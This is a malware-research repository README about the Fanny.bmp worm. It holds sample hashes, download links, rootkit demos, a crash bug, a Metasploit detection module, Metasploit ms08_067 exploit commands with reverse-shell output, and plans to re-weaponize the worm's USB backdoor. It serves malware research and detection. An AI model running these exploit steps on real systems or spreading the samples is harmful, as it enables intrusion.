### **$\textcolor{red}{\textsf{ MALWARE AHEAD! IF YOU  DO NOT  KNOW WHAT THAT IS  - LEAVE}}$**
`Note: if you see a lot of   $\textcolor{red}{\     then you need to enable javascript; it's basically just Red Text.`

⚠️ **This is only for research and Educational Purposes! Even if you run these in a Virtual Machine, I would [still] USE CAUTION.** ⚠️


# FannyBMP or DementiaWheel
- Related to `Brutal_Kangaroo` 
- (In)Directly related to the [nls_933w.dll file](https://github.com/loneicewolf/nls_933w_dll)

```
I made yet another Branch "only_malware" which ONLY CONTAINS THE FANNY.BMP MALWARE
```
### please find it  [here **only_malware⚠️**](https://github.com/loneicewolf/fanny.bmp/tree/only_malware)

# rootkit quick overview
![image](https://github.com/loneicewolf/fanny.bmp/assets/68499986/1839659e-adf7-4b3b-96e7-4f1b382f3a70)
- Q: `why did I use the 'runas' dialog to demonstrate the rootkit?`
- A: `cuz I wanted to show it does work on some text-inputs, as well`

And another screenshot:

![image](https://github.com/loneicewolf/fanny.bmp/assets/68499986/a85bff96-74f2-44cf-8c1e-621b87d6adf7)


***


Note! the technical report I wrote has a few* painfully-obvious flaws  (like being written in a hurry, so it has some* grammar errors)
the report will be re-written and re-publicized as the same with a new version number. 
This new version, will be much better in general. And more Related to the *actual research I did on the malware* rather than the malware in general.

I have quite little time on my hands now, so it will be delayd (this is just how I am).


### Points

Instead of having all the text (literally, **all** text) shown all at once, I decided to make `clickable` points, 
(if clicking doesn't work, please refer to the `raw` version of the readme or check it on another device)


`the most important things related to this repo is (most notably) My contribution(this repo) to the Rapid7 project(Metasploit);`
- https://blog.rapid7.com/2021/01/29/metasploit-wrap-up-96/
- https://www.rapid7.com/db/modules/post/windows/gather/forensics/fanny_bmp_check/
- https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules/post/windows/gather/forensics
- https://github.com/rapid7/metasploit-framework/tree/master/modules/post/windows/gather/forensics/




<details>
<summary>  Basic Info </summary>

```txt
Name
            FannyBMP or as the codename, DementiaWheel.

Description
             FannyBMP or as the codename, DementiaWheel
             Is a worm that exploited zero day vulns
             (more specifically, the LNK Exploit CVE-2010-2568).
             Which allowed it to spread (via usb) even if USB Autorun was turned off.
             This is the same(although somewhat more obfuscated) exploit that was used in StuxNet.


References
- https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787


CVE
 - 2010-2568

```

</details>



<details>
<summary> POC's (Proof Of Concepts)  </summary>

### YouTube infection run
![image](https://user-images.githubusercontent.com/68499986/204053660-bc331326-baae-4b79-b2e8-f9509d98c883.png)

- https://www.youtube.com/watch?v=Uto_lcD2f38


#### Fanny all files completely provided
includes:

- 
    - __d__.lnk - 148300b4c895bef313bee5eea9f40956510bc1e3878917cdd22baeabefb91179
    - https://www.virustotal.com/gui/file/148300b4c895bef313bee5eea9f40956510bc1e3878917cdd22baeabefb91179/detection

    - __e__.lnk - 276df113d13feaa98602918e09168ee4caadd3b797fdf7fcbe268f5741861bfa
    - https://www.virustotal.com/gui/file/276df113d13feaa98602918e09168ee4caadd3b797fdf7fcbe268f5741861bfa/detection

    - __f__.lnk - 8e1f99b858010fbf664419404a465ae98b51b40acc94231609367beca8e1652d
    - https://www.virustotal.com/gui/file/8e1f99b858010fbf664419404a465ae98b51b40acc94231609367beca8e1652d/detection

    - __g__.lnk - 6735dfcf86a0268e880429ebcc0062baa5515eaba69fd45cf4ea42b23f8e5809
    - https://www.virustotal.com/gui/file/6735dfcf86a0268e880429ebcc0062baa5515eaba69fd45cf4ea42b23f8e5809/detection

    - __h__.lnk - be1fd5a117142d2a80b6798058f66a0abea796986dae29e7902e6b0fe461a605
    - https://www.virustotal.com/gui/file/be1fd5a117142d2a80b6798058f66a0abea796986dae29e7902e6b0fe461a605/detection

    - __i__.lnk - 86f24cd880f445890c54883a40947fe103cceb92d5d3b17e7a9cf8143cdd04c9
    - https://www.virustotal.com/gui/file/86f24cd880f445890c54883a40947fe103cceb92d5d3b17e7a9cf8143cdd04c9/detection

    - __j__.lnk - 3696b414d8eaaaea4a9d220226e0e2ed458853eb1546959765aef8ccc0ba37b9
    - https://www.virustotal.com/gui/file/3696b414d8eaaaea4a9d220226e0e2ed458853eb1546959765aef8ccc0ba37b9/detection

    - comhost.dll - 0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231 
    - https://www.virustotal.com/gui/file/0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231/detection

    - mscorwin.dll - ef3135e462540adfba00234d75c4b21430f5a9037b61e7dc1014c8711ddc0047
    - https://www.virustotal.com/gui/file/ef3135e462540adfba00234d75c4b21430f5a9037b61e7dc1014c8711ddc0047/detection

    - shelldoc.dll - 6eb00b34d1daffa49b2f4c90841705b2c994563bde672bf35eb1c46cdb19a1ed
    - https://www.virustotal.com/gui/file/6eb00b34d1daffa49b2f4c90841705b2c994563bde672bf35eb1c46cdb19a1ed/detection

    - ECELP4.ACM - 787419d07f4bda9bc91072bb8644ed943089ad44f4bb5920bfe452dc111c244d
    - https://www.virustotal.com/gui/file/787419d07f4bda9bc91072bb8644ed943089ad44f4bb5920bfe452dc111c244d/detection

    - fanny.bmp - 0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231
    - https://www.virustotal.com/gui/file/0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231/detection

    - ~DE1923.tmp  -  c69a9157638e69fb692d827383c3f27e586e0c98989cffdf8bd4c982ad837a4c
    - https://www.virustotal.com/gui/file/c69a9157638e69fb692d827383c3f27e586e0c98989cffdf8bd4c982ad837a4c/detection

    - AGENTCPD.DLL - 1e77ae780e3f6389ffd6eae92887e531bf156943e31302c93be08a57ea90e6dd 
    - https://www.virustotal.com/gui/file/1e77ae780e3f6389ffd6eae92887e531bf156943e31302c93be08a57ea90e6dd/detection

    - dll_installer.dll [will provide soon (this is the inner module of Fanny.BMP)]


</details>




:radioactive: **Still unsorted (sorting it at the moment)** :radioactive:


<details>
<summary> not-done :warning: </summary>

- https://www.youtube.com/watch?v=Uto_lcD2f38



### related:
- [Gauss](Https://github.com/loneicewolf/Gauss-Src)
- [Stars](https://github.com/loneicewolf/Stars-virus)
- [Duqu](https://github.com/loneicewolf/DUQU)
- [FlamER](https://github.com/loneicewolf/flame-sourcecode)

--- please note that documentation(writing) (as below) is **not** my strongest front; so please this will be fuzzy; hopefully readable. -----




## important below
⚠️ this repo has serious issues. (1 major is the lot of Unnec. stuff, like old README (etc), ) **Why?!** *well, when I uploaded this - I did not think this would be interesting for others; so I didn't pay attention to make it "really readable"*

⚠️ which I was wrong about (soo wrong) - which is why I **will change this very soon** as I want this to be as clean as possible;

### therefore - please routinely check the 2nd branch (if possible)
- https://github.com/loneicewolf/fanny.bmp/tree/fresh_2022
- https://github.com/loneicewolf/fanny.bmp/branches

#### as I will upload and make it all very cleanly organized; with screenshots; and everything in one place(or, Hopefully I will be able to at least, make it decently well)



thanks for understanding!
have a good day!


---
### MAJOR update coming soon:
I will (when  I am done with the OSCP Exam, which is very soon! it actually is on 18th Jan! (writing from 2021 25 Dec (Happy Christmas! :) )))
Soon create & upload the following:
 - Recording (From scratch(0%), to 100%) of when Fanny.bmp infects a PLC (although.. It does *not* do anything, or even "infects a PLC" but, it detects PLC's in a kinda-similar way StuXNet did.) (although a virtual one, since I have not *real* access to a nuclear reactor.. For.. well, quite - **obvious reasons.**
 - Recording (again, From 0 to 100%)  of how one can "re-weaponize" Fanny.bmp (or,DementiaWheel as it's codename suggests) the USB-Backdoor to carry commands from & to Metasploit. (This is tested and, let's just say - it works, but needs improvement. (Massive improvements that is)) <- Still working on it.
 - A mini-library written in C (in combination with Lua) to make (the 2 points above ) a **bit** more user-friendly
 -    (JUST so you don't need to be a debugger-professional to understand how to get a reverse shell trough fanny's USB Backdoor for example.)



---




###### For the story Refer to both the article(s) I've been provided below, but also - if you're interested;  read my theory fanny.bmp's and StuXNet's purpose in the ISSUES page. "The Purpose of Fanny.bmp - in relation to StuXNet #7 "

#### Related samples: Agent.btz and  Stuxnet

 - https://github.com/loneicewolf/Stuxnet-Source
 - https://github.com/loneicewolf/Agent.btz


Refs:
 - https://blog.rapid7.com/2021/01/29/metasploit-wrap-up-96/
 - https://www.rapid7.com/db/modules/post/windows/gather/forensics/fanny_bmp_check/
 - https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules/post/windows/gather/forensics
 - https://github.com/rapid7/metasploit-framework/tree/master/modules/post/windows/gather/forensics/


##### [+1] video, demonstrating a Re-Creation of fanny.bmp to display a MessageBox(soon cmd)

#### Note, I have created a new POC video demonstrating fanny.bmp, as well as a bug
 (that I do not think is known? At least probably not to the developers that made fanny.bmp, although this is probably quite expected, that it would hide files using the prefix the rootkit is designed to just "hide").

But the unexpected thing was "to me anyway" that, it crashed explorer (and, the whole XP) while doing this.) This is done by "using"
the rootkit provided in fanny.bmp.

### How to re-create the Crash/bug:
#### watch the video https://www.youtube.com/watch?v=Uto_lcD2f38 (youtube)

If you name a folder/file/shortcut " _ _ e _ _ . l n k " (Note: Explorer will make the file not-displayed when you type __e__) and then, hopefully - it will crash with an error message. Or 2 error messages by the way.


## POC  (Proof Of Concept) Video(s)

-------------------

### The renewed video is here:

https://youtu.be/Uto_lcD2f38

###As well as the video file itself, here:
https://github.com/loneicewolf/fanny.bmp/blob/main/ReNewed(Fannybmp%20Winxp%20Poc)%20(With%20Rootkit%20Demo%20%2B%20Bug%20Crash)%20.mp4.7z

-------------------

The screenshot of the "empty" (not infected by fanny) USB (that, was "experimented" with and  later, as well infected by fanny.bmp) Displaying the files that the rootkit tried to hide, but it crashed explorer.exe with 2 error messages instead.

https://github.com/loneicewolf/fanny.bmp/blob/main/SanUltra%20(Fanny.bmp%20Bug).png


#### 2 Error messages from fanny.bmp  while it's rootkit was in use (and tried to hide a file/directory created by the user, called "__e__.lnk" in this example)

https://github.com/loneicewolf/fanny.bmp/blob/main/2Errors(while%20rootkit%20tried%20to%20hide%20__).png


#### For detection of fanny.bmp infections using MetaSploit,
#### you can now use my metasploit module avail. here: https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb
#### Documentation for
#### the module avail. here: at the wiki  https://github.com/loneicewolf/fanny.bmp/wiki/Docs

-------------

## POCS



By-OS:

 - [x] Windows XP Pro (SP3)   Screenshot: https://user-images.githubusercontent.com/68499986/102911824-e2678280-447c-11eb-8495-7180a52c7266.png
 - [x] Windows 10 Pro N (x64) Screenshot: https://raw.githubusercontent.com/loneicewolf/fanny.bmp/main/Windows10%20X64%20fanny_bmp_check.png

-------------


All these I thought of earlier providing, since I was one of the people that got this on my USB stick (my USB got infected long long time ago, Years ago now.) - But now - when I looked closer and I saw that some of these isn't even available online (Some of them are, still - like fanny.bmp and maybe some others, and ECELP4.acm) but not any of mscorwin / comhost, etc. (If they are - I would love to hear that! and the source of it. The more sources of same malware - the better. It strengthens the "community" if I can put it that way. And it is easier to find if all material is gathered at one place.
But I thought of providing all of these to malware researchers. As well as for academical purposes.

-------------

##### Note: In the video I provided, I had slight problems with the USB Keyboard. So I wrote "EDUCATIONAK" but meant "EDUCATIONAL". Contact me for any details.

-------------

(Q) Why would you want to upload malware? You're literally providing CyberWeapons!
(A) I believe in Open-Source, and that even though in this scenario, can hopefully help malware researchers provide better protection.

But the major point, is actually - as said above, but adding the following reason:
- to help the feature find these malware and samples. As I think there are very little (if not none) of these **easily** accessible online. (Samples that is)

-------------

### To Detect fanny, refer to this article:
- https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/  (And some the others)  at "Indicators of compromise (“one of each”):"
- https://www.rapid7.com/db/modules/post/windows/gather/forensics/fanny_bmp_check/ To detect it in Registry

And (for "optional" reading) I would suggest this one:
"AiR-ViBeR: Exfiltrating Data from Air-GappedComputers via Covert Surface ViBrAtIoNs." - writeup about Stuxnet,Fanny, Agent.btz (which is really like each others in ways)


### POC:

First, Git clone the fanny_bmp_check.rb from  Metasploit! (Now - always go to metasploit (oficially) to get the fanny.bmp module. To always get the latest version of it. In which I believe is vital when we talk security)

place it into your msf folder, (important, check the following step before placing it) usually located in /root/.msf4/modules/

* make the following folders: (under each other) /post/windows/gather/forensics/ <fanny_bmp_check.rb here>

Start msfconsole

use exploit/windows/smb/ms08_067_netapi

set RHOST and LHOST.

    msf6 exploit(windows/smb/ms08_067_netapi) > run

      [*] Started reverse TCP handler on 192.168.122.1:4444 
      [*] 192.168.122.160:445 - Automatically detecting the target...
      [*] 192.168.122.160:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
      [*] 192.168.122.160:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
      [*] 192.168.122.160:445 - Attempting to trigger the vulnerability...
      [*] Sending stage (175174 bytes) to 192.168.122.160
      [*] Meterpreter session 4 opened (192.168.122.1:4444 -> 192.168.122.160:1043) at 2020-12-22 16:55:02 +0100

meterpreter > run post/windows/gather/forensics/fanny_bmp_check

    [*] Searching registry on WORKSTATION1 for Fanny.bmp artifacts.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\Driver found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter2 found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter3 found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter8 found in registry.
    [*] WORKSTATION1: 4 result(s) found in registry.

------------


</details>
